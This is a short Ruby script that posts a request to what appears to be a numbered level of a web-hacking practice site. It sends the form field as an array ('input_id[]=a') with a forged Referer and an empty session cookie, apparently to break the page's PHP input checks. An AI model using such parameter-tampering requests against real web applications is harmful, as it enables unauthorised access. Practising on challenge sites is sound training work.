#!/usr/bin/ruby
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/take46.php')
Net::HTTP.start(uri.host){|http|
	resp=http.post(
		uri.path,
		'input_id[]=a',
		{
			'Referer'=>uri.to_s,
			'Cookie'=>'PHPSESSID=',
		}
	)
	puts resp.body
}